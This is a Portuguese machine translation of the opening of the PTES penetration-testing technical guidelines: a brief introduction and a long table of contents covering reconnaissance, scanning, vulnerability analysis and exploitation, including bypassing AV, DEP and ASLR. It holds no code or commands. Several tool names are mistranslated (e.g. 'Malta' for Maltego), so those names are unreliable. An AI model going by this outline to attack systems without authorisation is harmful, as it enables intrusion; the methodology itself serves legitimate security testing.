# Diretrizes-T-cnicas-PTES
O Padrão de Execução de Testes de Penetração
# <a name="top"></a>**Diretrizes Técnicas PTES**
Do padrão de execução de testes de penetração

[Ir para a navegação](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#mw-head) [Ir para pesquisar](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#searchInput) 

Esta seção foi elaborada como diretrizes técnicas do PTES que ajudam a definir certos procedimentos a serem seguidos durante um teste de penetração. Algo a ter em conta é que estes são apenas métodos de base que foram utilizados na indústria. Eles precisarão ser continuamente atualizados e alterados pela comunidade, bem como de acordo com seus próprios padrões. As diretrizes são apenas isso, algo para orientar você em uma direção e ajudar em determinados cenários, mas não um conjunto abrangente de instruções sobre como realizar um teste de penetração. Pense fora da caixa. 


## **Conteúdo**
- [1 Ferramentas necessárias](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Tools_Required) 
  - [1.1 Sistemas operacionais](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Operating_Systems) 
    - [1.1.1 Mac OS X](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#MacOS_X)
    - [1.1.2 Estação de trabalho VMware](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#VMware_Workstation) 
      - [1.1.2.1 Linux](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Linux)
      - [1.1.2.2 WindowsXP/7](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Windows_XP.2F7)
  - [1.2 Ferramentas de radiofrequência](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Radio_Frequency_Tools) 
    - [1.2.1 Contador de frequência](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Frequency_Counter)
    - [1.2.2 Scanner de frequência](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Frequency_Scanner)
    - [1.2.3 Analisador de espectro](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Spectrum_Analyzer)
    - [1.2.4 Adaptador USB 802.11](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#802.11_USB_adapter)
    - [1.2.5 Antenas Externas](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#External_Antennas)
    - [1.2.6 GPS USB](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#USB_GPS)
  - [1.3 Programas](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Software)
- [2 Coleta de informação](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Intelligence_Gathering) 
  - [2.1 OSINT](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#OSINT) 
    - [2.1.1 Corporativo](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Corporate)
    - [2.1.2 Físico](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Physical) 
      - [2.1.2.1 Localizações](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Locations)
      - [2.1.2.2 Compartilhado/Individual](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Shared.2FIndividual)
      - [2.1.2.3 Proprietário](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Owner) 
        - [2.1.2.3.1 Registros fundiários/fiscais](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Land.2Ftax_records)
    - [2.1.3 Locais de datacenter](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Datacenter_Locations) 
      - [2.1.3.1 Fusos horários](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Time_zones)
      - [2.1.3.2 Reunião externa](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Offsite_gathering)
      - [2.1.3.3 Produto/Serviços](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Product.2FServices)
      - [2.1.3.4 Datas da Empresa](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Company_Dates)
      - [2.1.3.5 Identificação de posição](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Position_identification)
      - [2.1.3.6 Organograma](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Organizational_Chart)
      - [2.1.3.7 Comunicações corporativas](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Corporate_Communications) 
        - [2.1.3.7.1 Marketing](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Marketing)
        - [2.1.3.7.2 Ações judiciais](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Lawsuits)
        - [2.1.3.7.3 Transações](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Transactions)
      - [2.1.3.8 Vagas de emprego](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Job_openings)
    - [2.1.4 Relacionamentos](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Relationships) 
      - [2.1.4.1 Afiliações de caridade](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Charity_Affiliations)
      - [2.1.4.2 Provedores de rede](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Network_Providers)
      - [2.1.4.3 Parceiros de negócios](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Business_Partners)
      - [2.1.4.4 Concorrentes](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Competitors)
  - [2.2 Indivíduos](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Individuals) 
    - [2.2.1 Perfil de rede social](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Social_Networking_Profile)
    - [2.2.2 Sites de redes sociais](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Social_Networking_Websites)
    - [2.2.3 Repugnante](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Cree.py)
  - [2.3 Pegada da Internet](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Internet_Footprint) 
    - [2.3.1 Endereço de e-mail](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Email_addresses) 
      - [2.3.1.1 Malta](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Maltego)
      - [2.3.1.2 A colheitadeira](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#TheHarvester)
      - [2.3.1.3 NetGlub](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#NetGlub)
    - [2.3.2 Nomes de usuário/Identificadores](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Usernames.2FHandles)
    - [2.3.3 Redes sociais](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Social_Networks) 
      - [2.3.3.1 Grupos de notícias](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Newsgroups)
      - [2.3.3.2 Listas de discussão](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Mailing_Lists)
      - [2.3.3.3 Salas de conversa](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Chat_Rooms)
      - [2.3.3.4 Pesquisa em fóruns](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Forums_Search)
    - [2.3.4 Nomes de domínio pessoais](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Personal_Domain_Names)
    - [2.3.5 Atividades Pessoais](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Personal_Activities) 
      - [2.3.5.1 Áudio](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Audio)
      - [2.3.5.2 Vídeo](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Video)
    - [2.3.6 Informações arquivadas](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Archived_Information)
    - [2.3.7 Dados Eletrônicos](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Electronic_Data) 
      - [2.3.7.1 Vazamento de documentos](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Document_leakage)
      - [2.3.7.2 Vazamento de metadados](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Metadata_leakage) 
        - [2.3.7.2.1 FOCA (janelas)](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#FOCA_.28Windows.29)
        - [2.3.7.2.2 Foundstone SiteDigger (Windows)](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Foundstone_SiteDigger_.28Windows.29)
        - [2.3.7.2.3 Metagoofil (Linux/Windows)](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Metagoofil_.28Linux.2FWindows.29)
        - [2.3.7.2.4 Leitor Exif (Windows)](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Exif_Reader_.28Windows.29)
        - [2.3.7.2.5 ExifTool (Windows/OS X)](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#ExifTool_.28Windows.2F_OS_X.29)
        - [2.3.7.2.6 Pesquisa de imagem](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Image_Search)
  - [2.4 Reunião secreta](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Covert_gathering) 
    - [2.4.1 Reunião no local](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#On-location_gathering) 
      - [2.4.1.1 Instalações Adjacentes](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Adjacent_Facilities)
      - [2.4.1.2 Inspeções de segurança física](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Physical_security_inspections) 
        - [2.4.1.2.1 Seguranças](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Security_guards)
        - [2.4.1.2.2 Uso do emblema](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Badge_Usage)
        - [2.4.1.2.3 Dispositivos de bloqueio](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Locking_devices)
        - [2.4.1.2.4 Sistemas de detecção de intrusão (IDS)/Alarmes](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Intrusion_detection_systems_.28IDS.29.2FAlarms)
        - [2.4.1.2.5 Iluminação de segurança](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Security_lighting)
        - [2.4.1.2.6 Sistemas de vigilância/CCTV](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Surveillance_.2FCCTV_systems)
        - [2.4.1.2.7 Dispositivos de controle de acesso](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Access_control_devices)
        - [2.4.1.2.8 Design Ambiental](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Environmental_Design)
      - [2.4.1.3 Comportamento do Funcionário](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Employee_Behavior)
      - [2.4.1.4 Mergulhar na lixeira](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Dumpster_diving)
      - [2.4.1.5 Varredura de frequência RF / sem fio](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#RF_.2F_Wireless_Frequency_scanning)
    - [2.4.2 Uso de frequência](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Frequency_Usage)
    - [2.4.3 Identificação do Equipamento](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Equipment_Identification) 
      - [2.4.3.1 Airmon-ng](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Airmon-ng)
      - [2.4.3.2 Airodump-ng](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Airodump-ng)
      - [2.4.3.3 Kismet-Newcore](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Kismet-Newcore)
      - [2.4.3.4 inSSIDer](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#inSSIDer)
  - [2,5 Pegada Externa](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#External_Footprinting) 
    - [2.5.1 Identificando intervalos de IP](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Identifying_IP_Ranges) 
      - [2.5.1.1 Pesquisa WHOIS](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#WHOIS_lookup)
      - [2.5.1.2 Óculos BGP](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#BGP_looking_glasses)
    - [2.5.2 Reconhecimento Ativo](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Active_Reconnaissance)
    - [2.5.3 Reconhecimento Passivo](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Passive_Reconnaissance)
    - [2.5.4 Pegada Ativa](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Active_Footprinting) 
      - [2.5.4.1 Transferências de zona](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Zone_Transfers) 
        - [2.5.4.1.1 Hospedar](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Host)
        - [2.5.4.1.2 Escavação](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Dig)
      - [2.5.4.2 DNS reverso](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Reverse_DNS)
      - [2.5.4.3 Brutificação de DNS](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#DNS_Bruting) 
        - [2.5.4.3.1 Fierce2 (Linux)](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Fierce2_.28Linux.29)
        - [2.5.4.3.2 DNSEnum (Linux)](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#DNSEnum_.28Linux.29)
        - [2.5.4.3.3 Dnsdict6 (Linux)](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Dnsdict6_.28Linux.29)
      - [2.5.4.4 Varredura de porta](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Port_Scanning) 
        - [2.5.4.4.1 Nmap (Windows/Linux)](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Nmap_.28Windows.2FLinux.29)
      - [2.5.4.5 Varreduras SNMP](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#SNMP_Sweeps) 
        - [2.5.4.5.1 SNMPEnum (Linux)](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#SNMPEnum_.28Linux.29)
      - [2.5.4.6 Recuperação de SMTP](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#SMTP_Bounce_Back)
      - [2.5.4.7 Agarrando banner](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Banner_Grabbing) 
        - [2.5.4.7.1 HTTP](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#HTTP)
  - [2.6 Pegada Interna](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Internal_Footprinting) 
    - [2.6.1 Pegada Ativa](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Active_Footprinting_2) 
      - [2.6.1.1 Varreduras de ping](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Ping_Sweeps) 
        - [2.6.1.1.1 Nmap (Windows/Linux)](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Nmap_.28Windows.2FLinux.29_2)
        - [2.6.1.1.2 Vivo6 (Linux)](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Alive6_.28Linux.29)
      - [2.6.1.2 Varredura de porta](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Port_Scanning_2) 
        - [2.6.1.2.1 Nmap (Windows/Linux)](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Nmap_.28Windows.2FLinux.29_3)
      - [2.6.1.3 Varreduras SNMP](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#SNMP_Sweeps_2) 
        - [2.6.1.3.1 SNMPEnum (Linux)](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#SNMPEnum_.28Linux.29_2)
      - [2.6.1.4 Metasploit](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Metasploit)
      - [2.6.1.5 Transferências de zona](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Zone_Transfers_2) 
        - [2.6.1.5.1 Hospedar](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Host_2)
        - [2.6.1.5.2 Escavação](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Dig_2)
      - [2.6.1.6 Recuperação de SMTP](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#SMTP_Bounce_Back_2)
      - [2.6.1.7 DNS reverso](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Reverse_DNS_2)
      - [2.6.1.8 Agarrando banner](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Banner_Grabbing_2) 
        - [2.6.1.8.1 HTTP](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#HTTP_2)
        - [2.6.1.8.2 httpimprimir](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#httprint)
      - [2.6.1.9 Mapeamento VoIP](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#VoIP_mapping) 
        - [2.6.1.9.1 Extensões](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Extensions)
        - [2.6.1.9.2 Svwar](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Svwar)
        - [2.6.1.9.3 enumIAX](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#enumIAX)
      - [2.6.1.10 Reconhecimento Passivo](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Passive_Reconnaissance_2) 
        - [2.6.1.10.1 Sniffing de pacotes](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Packet_Sniffing)
- [3 Análise de Vulnerabilidade](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Vulnerability_Analysis) 
  - [3.1 Teste de vulnerabilidade](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Vulnerability_Testing) 
    - [3.1.1 Ativo](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Active)
    - [3.1.2 Ferramentas automatizadas](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Automated_Tools) 
      - [3.1.2.1 Scanners de vulnerabilidade geral/de rede](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Network.2FGeneral_Vulnerability_Scanners)
      - [3.1.2.2 Sistema aberto de avaliação de vulnerabilidades (OpenVAS) (Linux)](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Open_Vulnerability_Assessment_System_.28OpenVAS.29_.28Linux.29)
      - [3.1.2.3 Nessus (Windows/Linux)](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Nessus_.28Windows.2FLinux.29)
      - [3.1.2.4 NeXpose](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#NeXpose)
      - [3.1.2.5 eEYE Retina](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#eEYE_Retina)
      - [3.1.2.6 Qualis](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Qualys)
      - [3.1.2.7 IMPACTO PRINCIPAL](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Core_IMPACT) 
        - [3.1.2.7.1 Web principal do IMPACT](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Core_IMPACT_Web)
        - [3.1.2.7.2 Núcleo IMPACTO WiFi](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Core_IMPACT_WiFi)
        - [3.1.2.7.3 Lado do cliente IMPACT principal](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Core_IMPACT_Client_Side)
        - [3.1.2.7.4 Web principal](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Core_Web)
        - [3.1.2.7.5 núcleoWEBcrawl](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#coreWEBcrawl)
        - [3.1.2.7.6 RPTs principais da Onestep Web](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Core_Onestep_Web_RPTs)
        - [3.1.2.7.7 Wi-Fi central](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Core_WiFi)
      - [3.1.2.8 SANTO](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#SAINT) 
        - [3.1.2.8.1 SAINTscanner](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#SAINTscanner)
        - [3.1.2.8.2 SAINTexploit](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#SAINTexploit)
        - [3.1.2.8.3 SAINT escritor](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#SAINTwriter)
    - [3.1.3 Verificadores de aplicativos da Web](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Web_Application_Scanners) 
      - [3.1.3.1 Verificadores gerais de aplicativos da Web](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#General_Web_Application_Scanners) 
        - [3.1.3.1.1 WebInspect (Windows)](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#WebInspect_.28Windows.29)
        - [3.1.3.1.2 IBM AppScan](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#IBM_AppScan)
        - [3.1.3.1.3 Listagem de diretórios da Web/força bruta](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Web_Directory_Listing.2FBruteforcing)
        - [3.1.3.1.4 Versão do servidor web/identificação de vulnerabilidade](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Webserver_Version.2FVulnerability_Identification)
      - [3.1.3.2 NetSparker (Windows)](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#NetSparker_.28Windows.29)
      - [3.1.3.3 Scanners especializados de vulnerabilidade](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Specialized_Vulnerability_Scanners) 
        - [3.1.3.3.1 Rede Privada Virtual (VPN)](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Virtual_Private_Networking_.28VPN.29)
        - [3.1.3.3.2 IPv6](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#IPv6)
        - [3.1.3.3.3 Discagem de guerra](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#War_Dialing)
    - [3.1.4 Teste Passivo](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Passive_Testing) 
      - [3.1.4.1 Ferramentas automatizadas](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Automated_Tools_2) 
        - [3.1.4.1.1 Monitoramento de tráfego](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Traffic_Monitoring)
      - [3.1.4.2 Wireshark](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Wireshark)
      - [3.1.4.3 tcpdump](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Tcpdump)
      - [3.1.4.4 Scanners Metasploit](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Metasploit_Scanners) 
        - [3.1.4.4.1 Metasploit liberado](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Metasploit_Unleashed)
  - [3.2 Validação de vulnerabilidade](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Vulnerability_Validation) 
    - [3.2.1 Pesquisa Pública](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Public_Research) 
      - [3.2.1.1 Senhas comuns/padrão](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Common.2Fdefault_passwords)
    - [3.2.2 Estabeleça uma lista de alvos](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Establish_target_list) 
      - [3.2.2.1 Mapeando Versões](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Mapping_Versions)
      - [3.2.2.2 Identificando níveis de patch](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Identifying_Patch_Levels)
      - [3.2.2.3 Procurando por aplicativos da Web fracos](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Looking_for_Weak_Web_Applications)
      - [3.2.2.4 Identifique portas e serviços fracos](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Identify_Weak_Ports_and_Services)
      - [3.2.2.5 Identificar limite de bloqueio](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Identify_Lockout_threshold)
  - [3.3 Avenidas de Ataque](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Attack_Avenues) 
    - [3.3.1 Criação de Árvores de Ataque](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Creation_of_Attack_Trees)
    - [3.3.2 Identifique mecanismos de proteção](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Identify_protection_mechanisms) 
      - [3.3.2.1 Proteções de rede](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Network_protections) 
        - [3.3.2.1.1 Filtros de pacotes "simples"](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#.22Simple.22_Packet_Filters)
        - [3.3.2.1.2 Dispositivos de modelagem de tráfego](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Traffic_shaping_devices)
        - [3.3.2.1.3 Sistemas de prevenção contra perda de dados (DLP)](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Data_Loss_Prevention_.28DLP.29_systems)
      - [3.3.2.2 Proteções baseadas em host](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Host_based_protections) 
        - [3.3.2.2.1 Proteções de pilha/heap](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Stack.2Fheap_protections)
        - [3.3.2.2.2 Lista de permissões](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Whitelisting)
        - [3.3.2.2.3 AV/Filtragem/Análise Comportamental](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#AV.2FFiltering.2FBehavioral_Analysis)
      - [3.3.2.3 Proteções em nível de aplicativo](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Application_level_protections)
- [4 Exploração](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Exploitation) 
  - [4.1 Golpe de precisão](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Precision_strike) 
    - [4.1.1 Desvio de contramedidas](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Countermeasure_Bypass) 
      - [4.1.1.1 AV](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#AV)
      - [4.1.1.2 Humano](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Human)
      - [4.1.1.3 QUADRIS](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#HIPS)
      - [4.1.1.4 DEP](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#DEP)
      - [4.1.1.5 ASLR](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#ASLR)
      - [4.1.1.6 VA+NX (Linux)](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#VA_.2B_NX_.28Linux.29)
      - [4.1.1.7 w^x (OpenBSD)](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#w.5Ex_.28OpenBSD.29)
      - [4.1.1.8 WAF](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#WAF)
      - [4.1.1.9 Pilha Canários](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Stack_Canaries) 
        - [4.1.1.9.1 Microsoft Windows](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Microsoft_Windows)
        - [4.1.1.9.2 Linux](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Linux_2)
        - [4.1.1.9.3 MAC OS](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#MAC_OS)
  - [4.2 Exploração Personalizada](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Customized_Exploitation) 
    - [4.2.1 Confuso](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Fuzzing)
    - [4.2.2 Fuzzing idiota](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Dumb_Fuzzing)
    - [4.2.3 Fuzzing Inteligente](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Intelligent_Fuzzing)
    - [4.2.4 Cheirando](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Sniffing) 
      - [4.2.4.1 Wireshark](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Wireshark_2)
      - [4.2.4.2 tcpdump](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Tcpdump_2)
    - [4.2.5 Força Bruta](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Brute-Force) 
      - [4.2.5.1 Bruto (Windows)](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Brutus_.28Windows.29)
      - [4.2.5.2 Web Bruto (Windows)](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Web_Brute_.28Windows.29)
      - [4.2.5.3 THC-Hydra/XHydra](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#THC-Hydra.2FXHydra)
      - [4.2.5.4 Medusa](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Medusa)
      - [4.2.5.5 Ncrack](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Ncrack)
    - [4.2.6 Protocolos de roteamento](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Routing_protocols)
    - [4.2.7 Protocolo de descoberta Cisco (CDP)](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Cisco_Discovery_Protocol_.28CDP.29)
    - [4.2.8 Protocolo de roteador Hot Standby (HSRP)](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Hot_Standby_Router_Protocol_.28HSRP.29)
    - [4.2.9 Protocolo de redundância de switch virtual (VSRP)](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Virtual_Switch_Redundancy_Protocol_.28VSRP.29)
    - [4.2.10 Protocolo de entroncamento dinâmico (DTP)](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Dynamic_Trunking_Protocol_.28DTP.29)
    - [4.2.11 Protocolo Spanning Tree (STP)](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Spanning_Tree_Protocol_.28STP.29)
